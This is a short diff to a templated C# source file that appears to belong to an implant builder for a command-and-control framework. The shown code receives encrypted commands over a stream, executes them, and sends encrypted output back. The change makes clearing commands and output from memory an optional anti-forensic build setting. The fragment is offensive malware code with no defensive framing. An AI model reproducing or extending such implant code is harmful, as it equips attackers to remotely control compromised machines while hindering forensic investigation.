@@ -183,7 +183,10 @@ namespace {{ implant.name }}
                             byte[] decryptedCtrl = Enx(buffer, bytesRead);
                             string ctrl = Encoding.UTF8.GetString(decryptedCtrl, 0, decryptedCtrl.Length).Trim();
                             //Console.WriteLine(String.Format("Received ctrl: {0}", ctrl));
+
+                            {% if clean_memory.enabled %}
                             Array.Clear(decryptedCtrl, 0, decryptedCtrl.Length);
+                            {% endif %}
                             
                             string output = E_ctrl(ctrl);
 
@@ -191,8 +194,10 @@ namespace {{ implant.name }}
                             byte[] encryptedResponse = Enx(Encoding.UTF8.GetBytes(output));
                             stream.Write(encryptedResponse, 0, encryptedResponse.Length);
 
+                            {% if clean_memory.enabled %}
 			    byte[] outputBytes = Encoding.UTF8.GetBytes(output);
 			    Array.Clear(outputBytes, 0, outputBytes.Length);
+                            {% endif %}
                         }
                     }
                 }
